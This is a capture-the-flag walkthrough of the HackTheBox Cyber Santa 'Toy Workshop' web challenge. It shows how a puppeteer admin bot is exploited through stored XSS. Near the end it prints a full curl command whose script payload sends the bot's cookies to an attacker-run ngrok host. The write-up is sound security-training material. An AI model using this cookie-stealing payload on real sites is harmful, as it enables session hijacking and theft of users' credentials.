---
title: Toy Workshop - Web
sidebar_position: 3
description: Walkthrough for the HackTheBox 2021 Cyber Santa competition challenge Toy Workshop in the web category.
---
## Challenge Name: Toy Workshop
### Topic: Web
### Challenge Prompt
`The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?`

### Walkthrough
This challenge has both a downloadable part and a docker service to accompany it. Download the challenge archive and extract it to see it's a node webserver.  
Start the docker service, going to that service brings us to a fun little animation of packages moving on a conveyor belt.  
Looking through the code given to use, we can see the internal workings of what is presumably running on the docker service. This webserver has a couple interesting files, notably:
`database.js`  
`routes/index.js`  
`bot.js`  

Lets look at `routes/index.js` first. We can see a route to `/api/submit` that allows post requests. It looks like its adding a "query" in a sqlite3 db that gets retrieved later. We see there's another endpoint at `/queries` that displays the queries submitted to `/api/submit` endpoint. It has a localhost restriction on it though, so my first though it some sort of xss attack later on.  
Switching over to `bot.js`, we see this is where the flag is being set as cookies and where puppeteer is being setup to navigate to the `/queries` endpoint as localhost. This has confirmed the earlier suspicion that it is an XSS attack.

Looking at `database.js`, we can see the logic for inserting queries into the database and for displaying them later on. I got stuck on this code for awhile, but it's not as important as the other two.  

Lets send some test queries to `/api/submit` using curl and see what we get back.

Command: `curl -H "Content-Type: application/json" -d '{"query": "1234"}' -X POST 138.68.184.31:30881/api/submit`   

Response: `{"message":"Your message is delivered successfully!"}`

We knew what parameters to supply due to having access to the source code, more specifically that information is found in `routes/index.js` on line 15: `const { query } = req.body;`  

So we know so far that it's most likely an XSS attack since puppeteer is being used to access the `/queries` endpoint as localhost so lets send some payloads and see what happens.  
Command: `curl -H "Content-Type: application/json" -d '{"query": "<script>console.log(document.cookie)</script>}' -X POST http://138.68.184.31:32360/api/submit`  
Response: `{"message":"Your message is delivered successfully!"}`

But we have an issue, we can't access `/queries` where the XSS attack will be executed, also this attack will only display our cookies to the console. Not send them to a place we can access. Luckily there's a solution to this issue and it's called `ngrok`.  

Ngrok allows you to tunnel a localhost webserver onto the wide internet. We can do this by first creating a directory for the webserver, then running `python -m http.server &` and then `ngrok http 8000`, after executing that command we'll be given a domain name to use in our attacks.

Now lets try an attack from a really useful resource over at https://0xhorizon.eu/cheat-sheet/xss/. The "get cookies from another user" is exactly what we're looking for. Modifying it with out ngrok domain gives us the following payload:  
`<script>document.location.replace(\"http://2774-2601-602-87f-9853-7df0-274a-fd62-32ae.ngrok.io?cookie=\"+document.cookie)</script>"` *note the escaped strings, that got me for awhile*

Inserting this into our curl command gives us the following complete payload:
`curl -H "Content-Type: application/json" -d '{"query": "<script>document.location.replace(\"http://2774-2601-602-87f-9853-7df0-274a-fd62-32ae.ngrok.io?cookie=\"+document.cookie)</script>"}' -X POST 138.68.184.31:30881/api/submit` Execute this payload and wait a couple of seconds and the flag should show in the terminal tab with ngrok:

![image](/img/cyber_santa/flag_ngrok.png)
